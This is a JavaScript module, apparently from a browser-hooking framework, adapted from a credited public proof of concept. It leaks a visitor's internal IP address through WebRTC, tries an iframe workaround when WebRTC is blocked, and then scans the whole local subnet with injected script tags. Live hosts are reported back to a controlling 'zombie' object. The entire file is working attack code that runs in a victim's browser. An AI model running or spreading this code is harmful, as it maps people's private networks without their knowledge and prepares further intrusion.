
/*
Utilizing Daniel Roesler's POC for WebRTC nat'd IP address retrieval
*/
  var server = JSON.parse(arguments[0])['server'];
  var timeout = parseInt(JSON.parse(arguments[0])['timeout']);
  var window = arguments[1];


  var RTCPeerConnection = window.RTCPeerConnection
        || window.mozRTCPeerConnection
        || window.webkitRTCPeerConnection;
  var useWebKit = !!window.webkitRTCPeerConnection;

  //iframe roundabout for webrtc blocking
  if(!RTCPeerConnection){
    var win = iframe.contentWindow;
    RTCPeerConnection = win.RTCPeerConnection
            || win.mozRTCPeerConnection
            || win.webkitRTCPeerConnection;
    useWebKit = !!win.webkitRTCPeerConnection;
  }

  var mediaConstraints = {
       optional : [{RtpDataChannels:true}],
  };

  var servers = {iceServers :[{urls: "stun:stun.services.mozzila.com"}]};

  var pc = new RTCPeerConnection(servers,mediaConstraints);


  pc.onicecandidate = function(ice){
    /*
    if(ice.candidate)
      scan(ice.candidate.candidate);*/
  };

  pc.createDataChannel("");

  pc.createOffer(function(result){
      pc.setLocalDescription(result,function(){},function(){});



  },function(){});



  var promise = new Promise(
      function(resolve,reject){
        setTimeout(function(){
            var lines = pc.localDescription.sdp.split('\n');
            var linec = 0;
            //helps to break out of foreach once internal ip is found/ don't need public
            var BreakException= {};
            try{
              lines.forEach(function(line){
                        if(line.indexOf('a=candidate:') === 0){
                          linec = line;
                          throw BreakException;
                      }
                    });
            }
            catch(e){
              if(e!= BreakException) throw e;
              //go scan once received local ip
              return resolve(linec);
            }



        },1000);
  });


  function scan(candidate){
    var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
    var ip_addr = ip_regex.exec(candidate);

      var natdIp = ip_addr[0];
      var net = natdIp.substring(0,natdIp.lastIndexOf('.')+1);
      var start =0;
      var end = 255;


      var controller = setInterval(function(){

        var url = 'http://'+net+start+'/';
        var script = document.createElement('script');
        //console.log(start);
        script.src = url;
        document.body.appendChild(script);
        document.body.removeChild(script);

        if(start==end)
          clearInterval(controller);
        start++;

      },timeout);
      //promise that will resolve to clearInterval for portscan
      return Promise.resolve((function(controller){return function clear(){clearInterval(controller);}})(controller));




  }






  window.onerror = function err(message,url,lineNumber){

      if(message.match(/Script error./)){
        window.zombie.update({'host':url});
      }
  }
//return new promise
  return promise.then(scan);
